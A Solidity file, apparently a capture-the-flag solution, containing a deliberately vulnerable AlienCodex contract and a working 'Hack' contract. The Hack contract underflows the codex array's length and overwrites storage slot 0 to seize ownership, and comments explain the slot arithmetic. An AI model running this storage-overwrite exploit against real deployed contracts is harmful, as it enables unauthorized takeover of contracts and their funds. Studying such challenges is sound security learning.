pragma solidity ^0.5.0;

contract Ownable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () internal {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(isOwner());
        _;
    }

    function isOwner() public view returns (bool) {
        return msg.sender == _owner;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0));
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract AlienCodex is Ownable {

  bool public contact;
  bytes32[] public codex;

  modifier contacted() {
    assert(contact);
    _;
  }
  
  function makeContact() public {
    contact = true;
  }

  function record(bytes32 _content) contacted public {
    codex.push(_content);
  }

  function retract() contacted public {
    codex.length--;
  }

  function revise(uint i, bytes32 _content) contacted public {
    codex[i] = _content;
  }
}

contract Hack {
  address _own;
  AlienCodex alien;
  constructor(AlienCodex _addr) public {
    alien = _addr;
  }
  function hack() public {
    alien.makeContact();
    alien.retract(); //since the codex array's length was 0. Calling retract function will make it -1 and 
    //since it is version ^0.5.0, -1 will underflow and will become 2**256 - 1 which is also the max storage
    //of the contract possible.
    //Now in slot 0 of the AlienCodex contract, we have owner variable(inherited from Ownable.sol). 
    //So basically we have to update the slot 0 of our contract.
    
    uint256 ind = -uint256(keccak256(abi.encode(1)));
    alien.revise(ind, bytes32(uint256(uint160(msg.sender))));
  }
  function own() public {
    _own = alien.owner();
  }
}

//Since length of array is 2**256 - 1 and which is also the total storage capacity of the contract. 
//We try to find the index which will update the slot 0.
//In the slot 1 of the AlienCodex contract, we will have the length of codex array stored. 
//And the actual value of this dynamic array will be stored from keccak256(1). 
//So at slot keccak256(1), we will have codex[0] stored.
//keccak256(1) + 1 -> codex[1]
//keccak256(1) + 2 -> codex[2]
// keccak256(1) + 2**256 - 1 -> codex[2**256 - 1]. But by this value, contract storage will get over, so its
//gonna start from slot 0 at some index i. We gotta find that index:
//keccak256(1) + i -> slot 0
//=> i = -keccak256(1)

//Thus, if we store our address at this index of array, we will update the slot 0.
